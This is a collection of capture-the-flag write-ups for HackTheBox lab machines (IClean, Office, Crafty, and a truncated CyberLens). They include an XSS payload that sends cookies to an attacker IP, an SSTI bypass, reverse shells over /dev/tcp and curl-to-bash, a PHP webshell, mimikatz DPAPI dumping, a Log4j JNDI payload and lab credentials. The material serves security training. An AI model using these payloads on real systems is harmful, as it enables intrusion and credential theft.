[{"content":" Title IClean Description IClean is a medium-difficulty Linux machine featuring a website for a cleaning services company. The website contains a form where users can request a quote, which is found to be vulnerable to Cross-Site Scripting (XSS). This vulnerability is exploited to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to Server-Side Template Injection (SSTI), allowing us to obtain a reverse shell on the box. Enumeration reveals database credentials, which are leveraged to gain access to the database, leading to the discovery of a user hash. Cracking this hash provides SSH access to the machine. The user’s mail mentions working with PDFs. By examining the sudo configuration, it is found that the user can run qpdf as root. This is leveraged to attach the root private key to a PDF, which is then used to gain privileged access to the machine. Difficulty Medium Maker LazyTitan33 Foothold Nmap └─$ nmap -sC -sV -oA nmap/iclean 10.10.11.12\r# Nmap 7.94SVN scan initiated Tue Jul 23 22:26:36 2024 as: nmap -sC -sV -oA nmap/iclean 10.10.11.12\rNmap scan report for 10.10.11.12\rHost is up (0.092s latency).\rNot shown: 998 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey:\r| 256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)\r|_ 256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r|_http-server-header: Apache/2.4.52 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel There are only 2 services running, ssh and http. On visiting the webpage, it is redirecting us to capiclean.htb adding the host in /etc/hosts. Now we can able to see the webpage.\nThe only functionality I can see is login page /login - try to bruteforce using hydra or get a quote /quote - sent mail to admin, which probably leads to XSS. On other hand, we can also try gobuster in order to get endpoints.\nGoBuster └─$ gobuster dir -u capiclean.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://capiclean.htb\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/about (Status: 200) [Size: 5267]\r/login (Status: 200) [Size: 2106]\r/services (Status: 200) [Size: 8592]\r/team (Status: 200) [Size: 8109]\r/quote (Status: 200) [Size: 2237]\r/logout (Status: 302) [Size: 189] [--\u0026gt; /]\r/dashboard (Status: 302) [Size: 189] [--\u0026gt; /]\r/choose (Status: 200) [Size: 6084] No interesting endpoint found from gobuster.\nXSS on Quote Page So, let\u0026rsquo;s start with quote page. On submitting the quote, it says - Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services. I can sense there is something to do related to XSS. Here is the request.\nI have tried simple payloads of XSS and URL encoded it, and yes, I got a hit. Payload used - \u0026lt;img src=x onerror=fetch(\u0026quot;http://10.10.15.125/?c=\u0026quot;+document.cookie);\u0026gt;\nHere is the session cookie - eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq16Cw.eOHOWeSVCA2DYHyuXuFx3IJLxOI. Now adding that to our browser. On our previous gobuster scan, we have seen there is a dashboard which was redirecting us to homepage, now it\u0026rsquo;s try to visit /dashboard.\nSSTI There are multiple functionalities in dashboard such as Generate Invoice, Generate QR, Edit Services, Quote Requests. So let\u0026rsquo;s start with first one, Generate Invoice. It will simply generate Invoice ID - 7251335009. Next, Generate QR will generate the QR code for invoice. On bottom of this page when you get QR URL, there is another field, that is generating invoice based on the images provided. Here is the request.\nNow, as it was evaluating the images, I thought of using SSTI payload, and luckily it worked.\nI have tried multiple payloads, but all of them are giving 500 - Internal Server Error except this one. {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\nThis Payload bypasses most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:\nSimple URL Encoding of reverse shell was not working - bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.125/4444 0\u0026gt;\u0026amp;1 So I have to use file and transfer it with curl and using bash execute it with this payload. So making a file with rev shell at shell and then start python http server and use this payload curl+http://10.10.15.125:8000/shell|bash.\nUser Flag In app.py \u0026gt; db_config we can able to get the password for user database user iclean\ndb_config = {\r\u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;,\r\u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;,\r\u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;,\r\u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39;\r} Get Full TTY using this commands\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;\rCtrl + Z\rstty raw -echo; fg\rThen it will continue the shell and just press enter(assuming you\u0026#39;re on kali) MySQL Login with mysql with this command mysql -u iclean -p then enter password.\nIn MySQL this are the commands used.\nCommands Description show databases; To get a list of databases use \u0026lt;db_name\u0026gt;; To select any particular DB show tables; To list all the tables on selected DB. SELECT To select rows from DB We got the hashes for admin and consuela user. With crackstation we can able to get the password for consuela user which is simple and clean.\nWe can able to login with SSH using this password.\nconsuela@iclean:~$ cat user.txt\r7b30cf22980c2fc947e1e25ab39db1c4 Root Flag With sudo -l we can able to run /usr/bin/qpdf binary as root.\nconsuela@iclean:~$ sudo -l\r[sudo] password for consuela:\rMatching Defaults entries for consuela on iclean:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser consuela may run the following commands on iclean:\r(ALL) /usr/bin/qpdf Checking --help in this binary.\nFrom help menu, I can not be able to do much, I have to see it\u0026rsquo;s official documentation for more context. And finally I came up with a payload.\nsudo /usr/bin/qpdf --empty /tmp/root.txt --qdf --add-attachment /root/root.txt --. It will create a root.txt file in tmp directory.\nRoot Flag - 4c2f59a87ce4ad788333aa64407c5563\n","description":"IClean is a medium-difficulty Linux machine featuring a website for a cleaning services company. The website contains a form where users can request a quote, which is found to be vulnerable to Cross-Site Scripting (XSS). This vulnerability is exploited to steal an admin cookie, which is then used to access the administrator dashboard. The page is vulnerable to Server-Side Template Injection (SSTI), allowing us to obtain a reverse shell on the box. Enumeration reveals database credentials, which are leveraged to gain access to the database, leading to the discovery of a user hash. Cracking this hash provides `SSH` access to the machine. The user’s mail mentions working with PDFs. By examining the `sudo` configuration, it is found that the user can run `qpdf` as `root`. This is leveraged to attach the `root` private key to a PDF, which is then used to gain privileged access to the machine.","id":0,"section":"posts","tags":["HackTheBox","XSS","gobuster","SSTI","mysql"],"title":"HackTheBox Writeup - IClean Room","uri":"https://g4nd1v.github.io/posts/hackthebox-iclean/"},{"content":" Title Office Description Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the MacroSecurityLevel registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges. Difficulty Hard Maker 0rii Footprinting 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 └─$ cat nmap/office.nmap # Nmap 7.94SVN scan initiated Sat Jun 29 11:58:59 2024 as: nmap -sC -sV -oA nmap/office 10.10.11.3 Nmap scan report for 10.10.11.3 Host is up (0.092s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_http-generator: Joomla! - Open Source Content Management | http-robots.txt: 16 disallowed entries (15 shown) | /joomla/administrator/ /administrator/ /api/ /bin/ | /cache/ /cli/ /components/ /includes/ /installation/ |_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ |_http-title: Home |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-29 23:59:17Z) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 |_http-title: 403 Forbidden |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-06-30T00:00:40+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-06-30T00:00:41+00:00; +8h00m01s from scanner time. | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.office.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC.office.htb | Not valid before: 2023-05-10T12:36:58 |_Not valid after: 2024-05-09T12:36:58 |_ssl-date: 2024-06-30T00:00:40+00:00; +8h00m01s from scanner time. Service Info: Hosts: www.example.com, DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-06-30T00:00:01 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m00s Notable Services Running Port Service 80 joomla 445 SMB 465 Kerberos 636 LDAP Notable Domains office.htb dc.office.htb\nAdd this domains to /etc/hosts Joomla From http://office.htb/administrator/manifests/files/joomla.xml file, we found the version of Joomla is 4.2.7. Checking for the CVE will lead up to this https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT - CVE-2023-23752.\nMore info about vuln - https://vulncheck.com/blog/joomla-for-rce\npython3 CVE-2023-23752.py -u http://office.htb\nWe got the password - H0lOgrams4reTakIng0Ver754!\nThere is a page /api/index.php/v1/users?public=true where we can find users.\nWe found one more domain - holography.htb add this domain to /etc/hosts.\nI have tried to login with this username and password with both of the domains. But it is not allowing us to login. Next thing we need is the username or something.\nUsername Enumeration We can bruteforce username using kerbrute. and we can use jsmith wordlist.\n./kerbrute_linux_386 userenum -d office.htb --dc 10.10.11.3 ./jsmith\nAdd list of usernames to user.txt\newhite\rdmichael\rdwolfe\rtstark\rhhogan\rppotts Password Spraying As we have list of usernames and a password, we can do password spraying attack. We can use crackmapexec for it.\nWe found a username dwolfe.\nSMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)\rSMB 10.10.11.3 445 DC [-] office.htb\\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE\rSMB 10.10.11.3 445 DC [-] office.htb\\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE\rSMB 10.10.11.3 445 DC [+] office.htb\\dwolfe:H0lOgrams4reTakIng0Ver754! SMB Enumeration List shares\nGet SOC Analysis share\nPcap Analysis We got pcap file named as Latest-System-Dump-8fbc124d.pcap. Open it with wireshark. Go to Statistics \u0026gt; Protocol Hierarchy to see the protocols that are being used. We can see, TCP, UDP, SMB, Kerberos etc protocols. We can directly follow TCP stream by right clicking the protocol.\nWe are following Kerberos stream and in that packet, we found Kerberos hash.\nThe etype of hash is 18, so we will use Kerberos 5, etype 18, Pre-Auth - 19900 mode in hashcat in order to crack the hash. Also we can see the hash is of tstark user.\nAppend the hash string with the cipher, so the hash will be $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc\n└─$ hashcat -m 19900 tstark.hash /usr/share/wordlists/rockyou.txt --show\r$krb5pa$18$hashcat$google.com$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 Again, checking this creds with crackmapexec.\n└─$ sudo crackmapexec smb 10.10.11.3 -u tstark -p playboy69\r[sudo] password for kali:\rSMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)\rSMB 10.10.11.3 445 DC [+] office.htb\\tstark:playboy69 I have tried to login with SMB with this creds, but it has same shares as before. I have tried to login with this creds in office.htb Jooma admin portal, but didn\u0026rsquo;t work. Then I remember that it has administrator user, so I have tried to use this password playboy69 with that username, and boom, we can able to login.\nweb account shell Now, go to System -\u0026gt; sites templates -\u0026gt; Cassiopeia Details and Files -\u0026gt; edit error.php - add this line after php system($_GET['cmd']);. Then make an request to the shell.\nIt keeps on reloading the code, so we have to keep an eye on updating file every time. Now generate a reverse shell from revshells.com and instead of whoami enter it with rev shell and replace spaces with + and boom, we will get the shell from web_account\ntstark shell and user flag We can use RunasCs and nc to get tstark shell as we already have it\u0026rsquo;s credentials.\nDownload each files and using python3 -m http.server transfer each files to windows with this wget http://10.10.14.156/nc.exe -o C:\\Windows\\Tasks\\nc.exe.\nNow, run the binary in order to get tstark shell.\nC:\\Windows\\Tasks\\runas.exe tstark playboy69 cmd.exe -r 10.10.14.156:443\n1 2 PS C:\\Users\\tstark\\Desktop\u0026gt; cat user.txt 7870a5d3dbb5ec949ccc83cc1c3069d6 PPots Shell Checking groups and privilages from tstark user.\nPS C:\\Users\u0026gt; whoami /priv\rwhoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= ============================== ========\rSeMachineAccountPrivilege Add workstations to domain Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\rPS C:\\Users\u0026gt; whoami /groups\rwhoami /groups\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes\r========================================== ================ ============================================= ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only\rBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group\rCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rOFFICE\\Registry Editors Group S-1-5-21-1199398058-4196589450-691661856-1106 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\Medium Mandatory Level Label S-1-16-8192 It seems that tstark is in OFFICE\\Registry Editors which means, this user can make changes to registry. Nothing interesting found in tstark user\u0026rsquo;s directory, so I went back to xampp. There are 3 folders.\nThere is nothing in administrator folder. We have already seen joomla website. There is an internal folder where it seems another website is hosted.\nAlso, while enumerating C:\\Program Files\\ I found LibreOffice 5 is installed.\nOkay, enough of enumeration, We will now visit the internal file. We have to find the port number of that application and then using chisel, we will do port forwarding so that we can able to view website from our machine.\nFrom C:\\xampp\\apache\\conf\\httpd.conf we can able to see the port number of the application. That is 8083.\nInstall Chisel from it\u0026rsquo;s release page. Transfer windows file to windows machine and we will now try to connect it.\nOn Windows Machine\r.\\chisel_1.9.1_windows_amd64 client 10.10.14.152:8000 R:8083:127.0.0.1:8083\rOn Linux Machine\r./chisel_1.9.1_linux_amd64 server --port 8001 --reverse Now visiting 127.0.0.1:8083 will give us the internal website. In the website, there is a page to upload the resume where I tried to upload png file, it gave me this error Accepted File Types : Doc, Docx, Docm, Odt!.\nOn searching for Libre Office 5 exploit, I found this one CVE-2023-2255\nUse this command in order to generate the file python3 CVE-2023-2255.py --cmd \u0026quot;cmd /c \u0026lt;rev_shell_base64_payload\u0026gt;, now upload the file to in place of resume and wait for sometime to get the shell.\nAnd yes, we got the shell as ppotts.\nShell as HHogan Checking vaultcmd /list gave us this results.\nWhereas system level creds are stored in C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials. It gave us 3 files. Moreover, we can also see protected files at this location C:\\users\\ppotts\\appdata\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107.\nGetting the key .\\mimikatz.exe \u0026quot;dpapi::masterkey /in:C:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\S-1-5-21-1199398058-4196589450-691661856-1107\\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc\u0026quot; exit\nThis is the key - 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166\nNow trying masterkey on each of the file, and this is the one which gave us the password - .\\mimikatz.exe \u0026quot;dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials\\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166\u0026quot; exit\nUserName : OFFICE\\HHogan\rCredentialBlob : H4ppyFtW183# Administrator We can get shell using evil-winrm - evil-winrm -i office.htb -u hhogan -p 'H4ppyFtW183#'\nOn checking whoami /all we noticed that it is a member of GPO Managers group.\nThere are multiple GPOs.\n*Evil-WinRM* PS C:\\Users\\HHogan\\Documents\u0026gt; Get-GPO -All | Select-Object DisplayName\rDisplayName\r-----------\rWindows Firewall GPO\rDefault Domain Policy\rDefault Active Directory Settings GPO\rDefault Domain Controllers Policy\rWindows Update GPO\rWindows Update Domain Policy\rSoftware Installation GPO\rPassword Policy GPO In order to edit GPO, we can download the binary from here.\nTrying with different GPOs eventually give us admin access to HHogan user. In order to make it effective, we have to reload GPOs using gpupdate /force. Also, we have to reconnect in get it.\nAfter reconnecting, we can able to get the flag.\n1 2 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt e4641807a5835f83cc6381d15af788ae Credentials Service User Password SMB dwolfe H0lOgrams4reTakIng0Ver754! tstark playboy69 Joomla Admin Administrator playboy69 HHogan H4ppyFtW183# ","description":"Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.","id":1,"section":"posts","tags":["HackTheBox","CVE-2023-2255","CVE-2023-23752","Joomla","Kerbrute","Wireshark","Libreoffice","dpapi","mimikatz","GPO","Chisel"],"title":"HackTheBox Writeup - Office Room","uri":"https://g4nd1v.github.io/posts/hackthebox-office/"},{"content":"Crafty Title Crafty Description HTB Windows Easy Machine Difficulty Easy Maker TheCyberGeek \u0026amp; felamos Enumeration Starting with Nmap,\n└─$ nmap -sC -sV -oA nmap/crafty 10.10.11.249\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:28 EDT\rNmap scan report for 10.10.11.249\rHost is up (0.11s latency).\rNot shown: 999 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http Microsoft IIS httpd 10.0\r|_http-server-header: Microsoft-IIS/10.0\r|_http-title: Did not follow redirect to http://crafty.htb\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Add crafty.htb to /etc/hosts. On visiting website, we found another domain - play.crafty.htb add that to hosts as well. I have tried to find subdomains using ffuf but didn\u0026rsquo;t found any.\nAs I am clueless now, I have decided to run full nmap scan for all the ports.\n└─$ nmap -sC -sV -p- -oA nmap/crafty 10.10.11.249\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 07:29 EDT\rStats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan\rConnect Scan Timing: About 2.83% done; ETC: 07:35 (0:06:18 remaining)\rNmap scan report for 10.10.11.249\rHost is up (0.081s latency).\rNot shown: 65533 filtered tcp ports (no-response)\rPORT STATE SERVICE VERSION\r80/tcp open http Microsoft IIS httpd 10.0\r|_http-title: Did not follow redirect to http://crafty.htb\r|_http-server-header: Microsoft-IIS/10.0\r25565/tcp open minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows See, we have another port open that we missed earlier. Port 25565 which is Minecraft 1.16.5. We can download Minecraft client from here https://github.com/MCCTeam/Minecraft-Console-Client/releases.\n└─$ ./MinecraftClient-20240415-263-linux-x64 --help\rMinecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam\rGitHub build 263, built on 2024-04-15 from commit 403284c\rCommand-Line Help:\rMinecraftClient.exe \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026lt;server\u0026gt;\rMinecraftClient.exe \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026lt;server\u0026gt; \u0026#34;/mycommand\u0026#34;\rMinecraftClient.exe --setting=value [--other settings]\rMinecraftClient.exe --section.setting=value [--other settings]\rMinecraftClient.exe \u0026lt;settings-file.ini\u0026gt; [--other settings] Joining server with username and password\n└─$ ./MinecraftClient-20240415-263-linux-x64 g4nd1v \u0026#39;\u0026#39; 10.10.11.249\rMinecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam\rGitHub build 263, built on 2024-04-15 from commit 403284c\rPassword(invisible):\rYou chose to run in offline mode.\rRetrieving Server Info...\rServer version : 1.16.5 (protocol v754)\r[MCC] Version is supported.\rLogging in...\r[MCC] Server is in offline mode.\r[MCC] Server was successfully joined.\rType \u0026#39;/quit\u0026#39; to leave the server.\r\u0026gt; User Flag Download Log4j POC from github - https://github.com/kozmer/log4j-shell-poc\nChange line 26 from String cmd=\u0026quot;/bin/sh\u0026quot;; to String cmd=\u0026quot;cmd.exe\u0026quot;; and run this command to start the POC script.\npython3 poc.py --userip 10.10.14.166 --webport 8000 --lport 9001 also start netcat listener on other tab - nc -lvnp 9001 and paste the generated ${jndi:ldap://10.10.14.29:1389}/a into Minecraft server.\n1 2 c:\\Users\\svc_minecraft\\Desktop\u0026gt;type user.txt 7285f344585dc116f9d03b900d275e05 Root Flag There is a playercounter-1.0-SNAPSHOT.jar file in c:\\Users\\svc_minecraft\\server\\plugins, so we will download the file and inspect if we can find anything interesting into it.\nIn order to transfer file, we will use smbserver from impacket - start smbserver with this command on our machine smbserver.py share . -smb2support and then copy the file.\ncopy playercounter-1.0-SNAPSHOT.jar \\\\10.10.14.166\\share\\\nBut, we cannot be able to copy because it is not allowed by the host. So we will use username and password to login.\n1. Use smbserver with username and password on attacker (our) machine\rsmbserver.py share . -smb2support -username g4nd1v -password g4nd1v\r2. allow share from host machine\rnet use \\\\10.10.14.166\\share /u:g4nd1v g4nd1v\r3. Now send the file\rcopy playercounter-1.0-SNAPSHOT.jar \\\\10.10.14.166\\share\\ Perfect, now we got the file, we will use online java decompiler to perform our task - https://jdec.app/\nHere, in the Playercounter.class there is a hardcoded password s67u84zKq8IXw. Maybe of Administrator? Let\u0026rsquo;s check.\nTransfer RunasCs from https://github.com/antonioCoco/RunasCs and then run it in our shell.\n1 2 3 4 5 c:\\Users\\svc_minecraft\\Desktop\u0026gt;RunasCs.exe Administrator s67u84zKq8IXw \u0026#34;cmd /c whoami\u0026#34; crafty\\administrator c:\\Users\\svc_minecraft\\Desktop\u0026gt;.\\RunasCs.exe Administrator s67u84zKq8IXw \u0026#34;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; 1ed2d80a98dec60ac1f21c1f5b981b2e ","description":"Detailed walkthrough of the Crafty room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":2,"section":"posts","tags":["HackTheBox","Log4j","CVE-2021-44228"],"title":"HackTheBox Writeup - Crafty Room","uri":"https://g4nd1v.github.io/posts/hackthebox-crafty/"},{"content":"mkingdom Title CyberLens Description Can you exploit the CyberLens web server and discover the hidden flags? Difficulty Easy Maker TeneBrae93 and tgreenMWR Nmap [└─$ nmap -sC -sV -oA nmap/mkingdom 10.10.0.63\r# Nmap 7.94SVN scan initiated Tue Jun 18 11:40:55 2024 as: nmap -sC -sV -oA nmap/mkingdom 10.10.0.63\rNmap scan report for 10.10.0.63\rHost is up (0.10s latency).\rNot shown: 999 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r85/tcp open http Apache httpd 2.4.7 ((Ubuntu))\r|_http-server-header: Apache/2.4.7 (Ubuntu)\r|_http-title: 0H N0! PWN3D 4G4IN](\u0026lt;└─$ cat nmap/cyberlens.nmap\r# Nmap 7.94SVN scan initiated Fri May 31 20:57:25 2024 as: nmap -sC -sV -oA nmap/cyberlens 10.10.94.45\rNmap scan report for 10.10.94.45\rHost is up (0.093s latency).\rNot shown: 995 closed tcp ports (conn-refused)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.57 ((Win64))\r|_http-title: CyberLens: Unveiling the Hidden Matrix\r| http-methods:\r|_ Potentially risky methods: TRACE\r|_http-server-header: Apache/2.4.57 (Win64)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r|_ssl-date: 2024-06-01T00:58:10+00:00; +1s from scanner time.\r| rdp-ntlm-info:\r| Target_Name: CYBERLENS\r| NetBIOS_Domain_Name: CYBERLENS\r| NetBIOS_Computer_Name: CYBERLENS\r| DNS_Domain_Name: CyberLens\r| DNS_Computer_Name: CyberLens\r| Product_Version: 10.0.17763\r|_ System_Time: 2024-06-01T00:58:01+00:00\r| ssl-cert: Subject: commonName=CyberLens\r| Not valid before: 2024-05-31T00:52:22\r|_Not valid after: 2024-11-30T00:52:22\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode:\r| 3:1:1:\r|_ Message signing enabled but not required\r| smb2-time:\r| date: 2024-06-01T00:58:03\r|_ start_date: N/A User Flag As there is smb service running, I tried login in with empty password, but I got \u0026ldquo;Access Denied\u0026rdquo;\n└─$ smbclient -L \\\\10.10.116.165\rPassword for [WORKGROUP\\kali]:\rsession setup failed: NT_STATUS_ACCESS_DENIED So, next thing I did was to visit homepage of the website and there is a upload file functionality in the website, and there is a button on side which says \u0026ldquo;Get Metadata\u0026rdquo;. So, I have uploaded sample jpeg image for testing.\nHere is the result from the uploaded file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { \u0026#34;Component 1\u0026#34;: \u0026#34;Y component: Quantization table 0, Sampling factors 2 horiz/2 vert\u0026#34;, \u0026#34;Component 2\u0026#34;: \u0026#34;Cb component: Quantization table 1, Sampling factors 1 horiz/1 vert\u0026#34;, \u0026#34;Component 3\u0026#34;: \u0026#34;Cr component: Quantization table 1, Sampling factors 1 horiz/1 vert\u0026#34;, \u0026#34;Compression Type\u0026#34;: \u0026#34;Baseline\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;image/jpeg\u0026#34;, \u0026#34;Data Precision\u0026#34;: \u0026#34;8 bits\u0026#34;, \u0026#34;File Modified Date\u0026#34;: \u0026#34;Thu Jun 20 01:46:46 +00:00 2024\u0026#34;, \u0026#34;File Name\u0026#34;: \u0026#34;apache-tika-12826399836580280142.tmp\u0026#34;, \u0026#34;File Size\u0026#34;: \u0026#34;27437 bytes\u0026#34;, \u0026#34;Image Height\u0026#34;: \u0026#34;460 pixels\u0026#34;, \u0026#34;Image Width\u0026#34;: \u0026#34;460 pixels\u0026#34;, \u0026#34;Number of Components\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;Number of Tables\u0026#34;: \u0026#34;4 Huffman tables\u0026#34;, \u0026#34;X-Parsed-By\u0026#34;: [ \u0026#34;org.apache.tika.parser.DefaultParser\u0026#34;, 